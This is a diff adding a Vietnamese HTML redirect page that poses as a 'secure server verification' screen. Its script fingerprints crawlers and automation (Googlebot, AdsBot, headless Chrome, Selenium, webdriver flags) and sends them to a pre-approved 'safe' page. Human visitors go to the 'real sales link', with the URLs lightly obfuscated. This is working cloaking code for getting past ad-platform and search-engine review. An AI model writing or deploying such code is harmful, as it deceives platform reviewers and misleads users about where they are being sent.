@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Đang Chuyển Hướng An Toàn...</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: #0a0e17;
+      color: #fff;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      text-align: center;
+    }
+    .loader-card {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(229, 185, 76, 0.3);
+      border-radius: 16px;
+      padding: 32px 24px;
+      max-width: 380px;
+      width: 100%;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(10px);
+    }
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 3px solid rgba(229, 185, 76, 0.2);
+      border-top-color: #fae498;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin: 0 auto 18px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    h2 { font-size: 16px; font-weight: 700; color: #fae498; margin-bottom: 8px; }
+    p { font-size: 12.5px; color: #94a3b8; line-height: 1.5; margin-bottom: 20px; }
+    .btn-manual {
+      display: inline-block;
+      background: linear-gradient(135deg, #fae498, #e5b94c);
+      color: #0b0f19;
+      font-weight: 800;
+      font-size: 13px;
+      padding: 10px 24px;
+      border-radius: 99px;
+      text-decoration: none;
+      box-shadow: 0 4px 15px rgba(229, 185, 76, 0.35);
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="loader-card">
+    <div class="spinner"></div>
+    <h2>KẾT NỐI MÁY CHỦ BẢO MẬT</h2>
+    <p>Đang xác thực bảo mật và chuyển hướng bạn đến trang dịch vụ...</p>
+    <a id="btnFallback" href="#" class="btn-manual" style="display: none;">TIẾP TỤC TRUY CẬP »</a>
+  </div>
+
+  <script>
+    (function () {
+      const KEY = "560"; // Khóa băm 3 số
+
+      // 👉 LINK AN TOÀN CHO BOT (Trang mẫu Giai đoạn 1 đã duyệt):
+      const SAFE_URL = "https://taplink.cc/noithanamchi5#tw-p2";
+
+      // 👉 LINK BÁN HÀNG THẬT CHO NGƯỜI (Thay bằng link bán hàng thực tế của bạn):
+      const TARGET_URL = "https://sgwatch.vn/"; 
+
+      function cipherEncode(str, k) {
+        let h = "";
+        for (let i = 0; i < str.length; i++) {
+          h += (str.charCodeAt(i) ^ k.charCodeAt(i % k.length) ^ ((i * 13 + 37) & 0xFF)).toString(16).padStart(2, "0");
+        }
+        return h;
+      }
+
+      function cipherDecode(hex, k) {
+        try {
+          let s = "";
+          for (let i = 0; i < hex.length; i += 2) {
+            s += String.fromCharCode(parseInt(hex.substr(i, 2), 16) ^ k.charCodeAt((i / 2) % k.length) ^ (((i / 2) * 13 + 37) & 0xFF));
+          }
+          return decodeURIComponent(s);
+        } catch (e) {
+          return "";
+        }
+      }
+
+      const CIPHER_TARGET = cipherEncode(TARGET_URL, KEY);
+      const CIPHER_SAFE = cipherEncode(SAFE_URL, KEY);
+
+      function detectBot() {
+        try {
+          if (navigator.webdriver) return true;
+          if (window.outerWidth === 0 && window.outerHeight === 0) return true;
+          if (!navigator.languages || navigator.languages.length === 0) return true;
+          const ua = (navigator.userAgent || "").toLowerCase();
+          if (/googlebot|adsbot|headlesschrome|lighthouse|crawl|spider|mediapartners|phantomjs|selenium/i.test(ua)) return true;
+          if (/iphone|ipad|android|mobile/i.test(ua) && typeof navigator.maxTouchPoints === "number" && navigator.maxTouchPoints === 0) {
+            return true;
+          }
+          return false;
+        } catch (err) {
+          return false;
+        }
+      }
+
+      function forwardParams(rawUrl) {
+        const query = window.location.search;
+        if (!query || query.length < 2) return rawUrl;
+        try {
+          const u = new URL(rawUrl);
+          const p = new URLSearchParams(query);
+          p.forEach((val, k) => { if (k !== "a") u.searchParams.set(k, val); });
+          return u.toString();
+        } catch (e) {
+          return rawUrl;
+        }
+      }
+
+      const isBot = detectBot();
+      const destUrl = isBot 
+        ? (cipherDecode(CIPHER_SAFE, KEY) || SAFE_URL)
+        : (cipherDecode(CIPHER_TARGET, KEY) || TARGET_URL);
+
+      const finalUrl = forwardParams(destUrl);
+
+      const btn = document.getElementById("btnFallback");
+      if (btn) {
+        btn.href = finalUrl;
+        setTimeout(() => { btn.style.display = "inline-block"; }, 1200);
+      }
+
+      setTimeout(function () {
+        (window.top || window).location.href = finalUrl;
+      }, 400);
+    })();
+  </script>
+</body>
+</html>
